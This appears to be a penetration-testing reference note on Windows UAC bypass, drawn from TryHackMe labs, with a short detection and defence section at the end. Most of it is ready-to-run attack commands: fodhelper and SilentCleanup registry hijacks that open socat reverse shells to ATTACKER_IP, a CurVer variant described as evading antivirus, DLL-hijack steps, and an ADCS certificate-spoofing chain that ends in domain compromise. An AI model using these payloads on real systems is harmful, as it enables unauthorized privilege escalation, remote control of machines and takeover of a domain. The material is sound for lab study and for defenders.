---
title: "UAC Bypass"
type: technique
tags: [com-hijacking, privilege-escalation, registry, thm, uac-bypass, windows]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-07-14
sources: [thm-uac-bypass, thm-adcs-cve2022-26923, hacktricks-windows]
---

# UAC Bypass

## What it is

User Account Control (UAC) is a Windows security mechanism that limits the privileges of standard processes, requiring explicit user consent (or credential prompt) before high-integrity operations run. A UAC bypass is a technique that elevates a medium-integrity process to high integrity without triggering the UAC consent prompt, by abusing auto-elevating binaries, COM objects, or environment variables.

## How it works

Windows assigns each process an "integrity level" (Low, Medium, High, System). UAC prompts appear when a Medium-integrity process requests High integrity. Certain signed Windows binaries are marked `<autoElevate>true</autoElevate>` in their manifests — the OS elevates them silently. If an attacker can control what these binaries load (via registry hijacking or environment variable injection), they inherit the elevated integrity level.

## Prerequisites

- Code execution as a standard user (Medium integrity) on the target
- UAC set to anything other than "Always notify" (i.e., the default setting is usually bypassable)
- Write access to HKCU registry keys (no admin required — HKCU is always writable by the current user)

## UAC Levels

| Level | Description | Bypassable |
|---|---|---|
| Always notify | Prompt for all changes (apps and Windows settings) | No |
| Notify only for app changes (Default) | Silent elevation for signed Windows binaries | Yes |
| Notify for app changes (no dimming) | Same but no secure desktop | Yes |
| Never notify | UAC effectively disabled | N/A |

Check current UAC level:
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

Check current process integrity:
```powershell
whoami /groups | find "Label"
# Look for: Mandatory Label\Medium Mandatory Level or High Mandatory Level
```

## Methodology

### 1. Identify Auto-Elevating Binaries

Signed binaries with `<autoElevate>true</autoElevate>` in their manifest elevate without prompting. Verify with Sigcheck:
```powershell
sigcheck64.exe -m C:\Windows\System32\msconfig.exe
# Look for <autoElevate>true</autoElevate> in the manifest output
```

Common auto-elevating binaries: `msconfig.exe`, `azman.msc`, `fodhelper.exe`, `eventvwr.exe`, `sdclt.exe`, `cleanmgr.exe`.

### 2. Fodhelper.exe Registry Hijack

`fodhelper.exe` (Features on Demand Helper) is auto-elevating and checks `HKCU\Software\Classes\ms-settings\Shell\Open\command` before running. Since HKCU is writable without admin rights, this is a reliable bypass.

**Basic variant:**
```cmd
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="cmd.exe /c start C:\Windows\System32\cmd.exe"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
fodhelper.exe
```

To get a reverse shell via socat:
```cmd
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:ATTACKER_IP:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
fodhelper.exe
```

**Improved variant (evades AV signature on `ms-settings` pattern) — redirect via CurVer:**
```powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:ATTACKER_IP:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.thm\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value $program -Force

New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".thm" -Force

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

The CurVer redirect means fodhelper reads `.thm` instead of `ms-settings` directly, bypassing AV patterns that flag the `ms-settings` path.

**Cleanup:**
```cmd
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

**Listener:**
```bash
nc -lvp 4445
```

**Verify elevation after getting shell:**
```powershell
whoami /groups | find "Label"
# Should show: Mandatory Label\High Mandatory Level
```

### 3. Disk Cleanup Scheduled Task (Environment Variable Hijack)

The `SilentCleanup` scheduled task runs as SYSTEM with the highest available privileges. It expands `%windir%` in its command, and `%windir%` can be overridden per-user via `HKCU\Environment`. This allows arbitrary command execution at high integrity without any UAC prompt.

The task runs:
```
%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
```

Override `%windir%` to inject a command:
```powershell
# The "&REM " at the end comments out the rest of the expanded command
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:ATTACKER_IP:4446 EXEC:cmd.exe,pipes &REM " /f
```

Trigger the task:
```powershell
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

The resulting full command becomes:
```
cmd.exe /c C:\tools\socat\socat.exe TCP:ATTACKER_IP:4446 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d C:
```

The `&REM` comments out everything after the payload.

**Cleanup:**
```powershell
reg delete "HKCU\Environment" /v "windir" /f
```

**Listener:**
```bash
nc -lvp 4446
```

## Key Payloads / Examples

Checking available auto-elevating COM objects (PowerShell):
```powershell
Get-ChildItem HKLM:\SOFTWARE\Classes\CLSID | Where-Object { $_.GetSubKeyNames() -contains "Elevation" }
```

Confirming elevation after bypass:
```powershell
whoami /groups | find "Label"
# Expect: Mandatory Label\High Mandatory Level
```

## Bypasses and Variants

### Eventvwr.exe Hijack (older technique, Windows 10 < 1709)
Event Viewer reads `HKCU\Software\Classes\mscfile\shell\open\command` before `HKLM`. Plant a payload there:
```cmd
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "cmd.exe" /f
eventvwr.exe
```

### Token Duplication
Copy the access token of an already-elevated process (e.g., Task Manager running at High integrity) into the current process. This requires SeImpersonatePrivilege or a similar privilege but no registry writes. Commonly implemented in tools like `PrintSpoofer` and `RoguePotato` for token impersonation.

### ADCS ESC1 — Privilege Escalation via Certificate Spoofing (CVE-2022-26923)

This is not strictly a UAC bypass but is a domain privilege escalation that bypasses the need to crack passwords. Any domain user with the right to add computer objects can obtain a Domain Controller-level certificate by:

1. Adding a fake computer object:
```bash
addcomputer.py 'domain/user:password' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'
```

2. Clearing the SPN and setting DNS hostname to match the DC:
```powershell
Set-ADComputer THMPC -ServicePrincipalName @{}
Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
```

3. Requesting a Machine template certificate for the fake computer — it issues a cert for the DC's hostname:
```bash
certipy req 'domain/THMPC$:Password1@@DC_IP' -ca CA_NAME -template Machine
```

4. Authenticating with the DC's certificate to obtain the DC machine account NTLM hash:
```bash
certipy auth -pfx lundc.pfx
# Returns NT hash for lundc$ (the domain controller machine account)
```

With the DC machine account hash, an attacker can perform DCSync and fully compromise the domain.

## UAC bypass method families (delta beyond fodhelper and silentcleanup)

Beyond fodhelper, the Disk Cleanup / silentcleanup env-var hijack, eventvwr, and
token duplication (above), the remaining families:

Auto-elevated binary plus per-user ProgID hijack. Several signed binaries
auto-elevate and resolve a handler from HKCU without validating it:

```text
computerdefaults.exe -> HKCU\Software\Classes\ms-settings\Shell\Open\command  (like fodhelper)
sdclt.exe            -> HKCU\Software\Classes\Folder\shell\open\command  or  exefile\shell\runas\command\isolatedCommand
```

fodhelper CurVer variant (avoids DelegateExecute): redirect the `ms-settings`
ProgID through a per-user `CurVer` to a custom extension you map to your payload,
all in HKCU, so no admin token is needed to plant the keys.

```powershell
New-Item "HKCU:\Software\Classes\.thm\Shell\Open\command" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\.thm\Shell\Open\command" '(default)' "C:\ProgramData\payload.exe"
Set-ItemProperty "HKCU:\Software\Classes\ms-settings" "CurVer" ".thm"
Start-Process "$env:WINDIR\System32\fodhelper.exe"
```

CMSTPLUA COM elevation-moniker: instantiate the auto-elevating `CMSTPLUA` COM
object via the `Elevation:Administrator!new:` moniker and call its shell/execute
method (the basis of `runasadmin uac-cmstplua` in offensive frameworks).

Auto-elevate plus DLL search-order hijack. Most UACME techniques drop a DLL that
an auto-elevating binary loads. `iscsicpl.exe` (SysWOW64) is a clean example:
place a malicious `iscsiexe.dll` in a user-writable folder and prepend that folder
to the user `PATH`, and the elevated process loads it with no prompt.

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\SysWOW64\iscsicpl.exe
```

General DLL-hijack methodology: find an auto-elevating binary, use Procmon to spot
a `NAME NOT FOUND` DLL load, then get the DLL into a protected path via `wusa.exe`
(Windows 7/8) or the `IFileOperation` COM copy (Windows 10). Newest surface:
Windows 11 25H2 Administrator Protection has a per-logon DOS-device-map drive
hijack (impersonate the shadow-admin token at Identification level to own
`\Sessions\0\DosDevices\<LUID>`, then plant a `C:` symlink). All require the user
to be in Administrators at Medium Integrity with UAC below the Always-Notify max.

## Detection and Defence

- Enable audit logging for registry modifications to HKCU\Software\Classes (Event ID 4657)
- Monitor for `fodhelper.exe`, `eventvwr.exe`, `sdclt.exe` spawning unusual child processes
- Alert on scheduled task `SilentCleanup` being triggered manually via `schtasks /run`
- Detect HKCU\Environment\windir registry key creation (legitimate users rarely set this)
- Set UAC to "Always notify" to prevent auto-elevation entirely (breaks some workflows)
- Enforce Windows Defender Attack Surface Reduction rules targeting COM-based bypass techniques
- Monitor certificate template permissions in ADCS; restrict who can enroll in Machine templates
- Apply ADCS patch for CVE-2022-26923 (KB5014754 — certificate-based strong mapping)

## Tools

- sigcheck (Sysinternals) — inspect binary manifests for autoElevate
- socat — reverse shell relay
- Mimikatz — token manipulation
- Certipy — ADCS enumeration and ESC1 exploitation
- Impacket — addcomputer.py for ADCS ESC1

## Sources

- TryHackMe: Bypassing UAC room
- TryHackMe: CVE-2022-26923 ADCS Template room
